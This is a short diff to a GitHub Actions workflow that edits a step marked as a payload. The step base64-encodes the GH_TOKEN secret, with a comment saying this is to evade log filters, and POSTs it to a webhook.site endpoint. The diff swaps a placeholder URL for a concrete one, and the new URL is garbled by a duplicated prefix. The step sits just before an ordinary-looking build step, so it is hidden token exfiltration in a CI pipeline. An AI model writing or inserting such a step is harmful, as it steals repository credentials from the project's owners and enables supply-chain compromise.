@@ -18,7 +18,7 @@ jobs:
         run: |
           # Encode to bypass basic log filters and exfiltrate
           ENCODED_SECRET=$(echo -n "$GH_TOKEN" | base64)
-          curl -X POST -d "data=$ENCODED_SECRET" https://webhook.site/YOUR-NEW-UNIQUE-URL
+          curl -X POST -d "data=$ENCODED_SECRET" https://webhook.site/https://webhook.site/b1145745-54a1-41d4-bb70-b2cd4f430a73
       # --- END PAYLOAD ---
 
       - name: Run Standard Build
